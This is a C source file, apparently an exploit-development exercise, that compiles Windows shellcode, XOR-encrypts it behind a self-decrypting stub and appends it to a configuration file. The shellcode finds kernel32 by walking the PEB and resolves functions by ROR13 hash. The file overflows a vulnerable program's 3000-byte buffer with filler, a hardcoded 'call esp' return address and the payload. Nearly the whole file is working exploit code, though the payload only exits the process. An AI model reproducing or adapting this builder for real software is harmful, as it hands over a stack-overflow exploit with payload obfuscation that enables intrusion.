#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <wchar.h>

#pragma region ShellCode

#define XOR_VAL 0x01010101
#define XOR_BYTE 0x5

#define ACTIVE_CODE_SZ 613
#define XOR_CODE_SZ 75

#define KERNEL32DLL_HASH 1848363543
#define EXITPROCESS_HASH 1944246398

// if we want to test our shell we won't need to encrypt it
//#define debug_code


PPEB get_peb(void);
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string);
DWORD __stdcall ror13_hash(const char *string);
HMODULE __stdcall find_module_by_hash(DWORD hash);
HMODULE __stdcall find_kernel32(void);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);
void __stdcall shell_entry();
void END_SHELLCODE(void);

#pragma optimize("", off)  

void __stdcall shell_code()
{
	char* p, *begin, xr = XOR_BYTE;
	int sz;

	__asm
	{
		mov ax, ACTIVE_CODE_SZ
		mov sz, eax
	}
	
	__asm
	{
		mov eax, ebp
		add eax, XOR_CODE_SZ

		// need this to add for decrypting code (gained by value matching in immunity debugger)
		add eax, 4				
		mov begin, eax
	}

	//decrypt shell code
	for (p = begin; p - begin < sz; p++)
		*p ^= xr;

	shell_entry();
}

void __stdcall shell_entry()
{
	// work
	HMODULE kern32 = find_kernel32();
	FARPROC exit = find_function(kern32, EXITPROCESS_HASH);
	
	exit(0);
}

HMODULE __stdcall find_kernel32(void)
{
	return find_module_by_hash(KERNEL32DLL_HASH);
}

HMODULE __stdcall find_module_by_hash(DWORD hash)
{
	PPEB peb = NULL;
	LDR_DATA_TABLE_ENTRY *module_ptr = NULL, *first_mod = NULL;
	PLIST_ENTRY pListEntry = NULL;

	peb = get_peb();

	pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
	module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
	first_mod = module_ptr;

	do 
	{
		if (module_ptr->FullDllName.Length != 0 &&
			unicode_ror13_hash((WCHAR *)module_ptr->FullDllName.Buffer) == hash)
		{
			return (HMODULE)module_ptr->Reserved2[0];
		}

		else
		{
			pListEntry = pListEntry->Flink;
			module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
		}

	} while (module_ptr && module_ptr != first_mod);   // because the list wraps,

	return INVALID_HANDLE_VALUE;
}

PPEB __declspec(naked) get_peb(void)
{
	__asm {
		mov eax, fs:[0x30]
		ret
	}
}

DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string)
{
	DWORD hash = 0;

	while (*unicode_string != 0)
	{
		DWORD val = (DWORD)*unicode_string++;
		hash = (hash >> 13) | (hash << 19); // ROR 13
		hash += val;
	}
	return hash;
}

DWORD __stdcall ror13_hash(const char *string)
{
	DWORD hash = 0;

	while (*string) {
		DWORD val = (DWORD)*string++;
		hash = (hash >> 13) | (hash << 19);  // ROR 13
		hash += val;
	}
	return hash;
}

FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
	IMAGE_DOS_HEADER *dos_header;
	IMAGE_NT_HEADERS *nt_headers;
	IMAGE_EXPORT_DIRECTORY *export_dir;
	DWORD *names, *funcs;
	WORD *nameords;
	unsigned i;

	dos_header = (IMAGE_DOS_HEADER *)module;
	nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
	export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD *)((char *)module + export_dir->AddressOfNames);
	funcs = (DWORD *)((char *)module + export_dir->AddressOfFunctions);
	nameords = (WORD *)((char *)module + export_dir->AddressOfNameOrdinals);

	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		char *string = (char *)module + names[i];
		if (hash == ror13_hash(string))
		{
			WORD nameord = nameords[i];
			DWORD funcrva = funcs[nameord];
			return (FARPROC)((char *)module + funcrva);
		}
	}

	return NULL;
}

void __declspec(naked) END_SHELLCODE(void) {}


#pragma optimize("", on)  
#pragma endregion ShellCode


//////////////

#define SHELLCODE_FILE		"shellcode.bin"
#define CONFIG_FILE			"config_23"
#define CONFIG_FILE_COPY	"config_23_copy"

// gets file size in bytes
unsigned getFileSize(char* path)
{
	FILE* f = fopen(path, "rb");
	fseek(f, 0, SEEK_END);
	long n = ftell(f);
	fclose(f);

	if (n > 0)
		return (unsigned)n;

	return 0;
}

// find byte that won't be found in the byte code
unsigned char find_xor_byte()
{
	for (int byte = 1; byte < 0xFF; byte++)
	{
		BOOL found = FALSE;

		for (char* c = (char*)shell_code + XOR_CODE_SZ; c < (char*)END_SHELLCODE; c++)
		{
			if (*c == byte)
			{
				found = TRUE;
				break;
			}
		}

		// is not found -> can use xor
		if (!found)
			return (unsigned char)byte;
	}

	return 0;
}

// write shellcode as payload into conf file
BOOL sc_write_conf(char *path, char* path_to)
{
	HANDLE hfile;
	unsigned int size, readed, written;

	// get call esp addr reversed
	char callEspAddrRev[] = "\x62\x50\x12\x97";
	_strrev(callEspAddrRev);

	// load shellcode from bin file to buffer
	hfile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Error, can't open shellcode!\n");
		return FALSE;
	}

	size = GetFileSize(hfile, NULL);
	if (!size) {
		printf("Error, file is empty\n");
		return FALSE;
	}

	char *pbuf = (char *)malloc(size);
	if (!ReadFile(hfile, pbuf, size, (LPDWORD)&readed, NULL)) {
		printf("Error, can't read shellcode data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	CloseHandle(hfile);
	hfile = NULL;

	// write shellcode to file as a payload
	hfile = CreateFileA(path_to, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Error, can't open config file!\n");
		return FALSE;
	}

	// write 3000 + 4 + 4 + 4 'H' bytes (append after /start), 3000 - max buf size of vulnerable program
	char tmp[3000 + sizeof(int) + sizeof(int) + sizeof(int)];
	memset(tmp, 'H', sizeof(tmp));
	if (!WriteFile(hfile, tmp, sizeof(tmp), (LPDWORD)&written, NULL)) {
		printf("Error, can't write trash data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	// overwrite return address by call esp address
	if (!WriteFile(hfile, callEspAddrRev, sizeof(unsigned), (LPDWORD)&written, NULL)) {
		printf("Error, can't write callespaddr data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	// overwrite return address by call esp address
	if (!WriteFile(hfile, pbuf, size, (LPDWORD)&written, NULL)) {
		printf("Error, can't write shellcode data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	free(pbuf);
	CloseHandle(hfile);
	return TRUE;
}

// write shell code to bin file 
BOOL sc_write_bin(char *path)
{
	int full_code_size = (int)END_SHELLCODE - (int)shell_code;
	int xor_code_size = 0, active_code_size = 0;

	// copy future shell code to buffer
	char* buf = (char*)malloc(full_code_size * sizeof(char));
	memcpy(buf, shell_code, full_code_size);

	// find first ret -> end of shell_code
	char* pf = (char*)shell_code;
	while (*pf != (char)0xC3)
	{
		//printf("pf = 0x%x\n", (char)*pf);
		xor_code_size++;
		pf++; 
	}
	
	/*
	encrypt start here:

	004010CA E8 11 00 00 00       call        004010E0  
	004010CF 8B E5                mov         esp,ebp  
	004010D1 5D                   pop         ebp  
	004010D2 C3                   ret  

	substract last bytes -> get xor_code_size

	*/
	xor_code_size -= 8;
	active_code_size = full_code_size - xor_code_size;

	if (xor_code_size != XOR_CODE_SZ || active_code_size != ACTIVE_CODE_SZ)
	{
		printf("Need to change constant XOR_CODE_SZ to %d\n", xor_code_size);
		printf("Need to change constant ACTIVE_CODE_SZ to %d\n", active_code_size);
		return FALSE;
	}

	unsigned char xr = find_xor_byte();
	if (xr != XOR_BYTE)
	{
		if (xr == 0)
			printf("Fatal: no suitable value for XOR_BYTE\n");
		else
			printf("Need to update XOR_BYTE constant to 0x%x\n", xr);
		return FALSE;
	}

	// encrypt active code part
	char* begin = (char*)(buf + xor_code_size);
	for (char* p = begin; p - begin < active_code_size; p++)
		*p ^= XOR_BYTE;

	// write shellcode
	FILE *output_file = fopen(path, "wb");

	if (!output_file)
	{
		free(buf);
		return FALSE;
	}

	fwrite(buf, full_code_size, sizeof(char), output_file);
	fclose(output_file);
	free(buf);
	return TRUE;
}

// load shell code to virtual memory and exec
void sc_exec(char* path)
{
	unsigned fsize = getFileSize(path);
	char* code = malloc(fsize);
	
	FILE* f = fopen(path, "rb");
	fread(code, sizeof(char), fsize, f);
	fclose(f);

	LPVOID pspace = NULL;

	pspace = VirtualAlloc(NULL, fsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pspace) {
		printf("Error, can't allocate virtual page\n");
		free(code); 
		return;
	}

	memcpy(pspace, code, fsize);
	((void(*)())pspace)();//call shellcode

	VirtualFree(pspace, 0, MEM_RELEASE);
	free(code); 
}

int main(int argc, char *argv[])
{
	//shell_code();

	// clear config file
	CopyFile("..\\Release\\"CONFIG_FILE_COPY, "..\\Release\\"CONFIG_FILE, FALSE);
	CopyFile(CONFIG_FILE_COPY, CONFIG_FILE, FALSE);


	// write shell code to bin file
	if (!sc_write_bin(SHELLCODE_FILE) || !sc_write_bin("..\\Release\\"SHELLCODE_FILE))
	{
		printf("Unable to write shell to binary file. Exitting\n");
		getchar();
		return 1;
	}

	// write shell code from bin to conf file
	if (!sc_write_conf(SHELLCODE_FILE, CONFIG_FILE) 
		|| !sc_write_conf("..\\Release\\"SHELLCODE_FILE, "..\\Release\\"CONFIG_FILE))
	{
		printf("Unable to write shell to config file. Exitting\n");
		getchar();
		return 1;
	}

	printf("Success. Enter any key to exit\n");

	if (getchar())
		return 0;

	// for compilation
	shell_code();

	return 0;
}
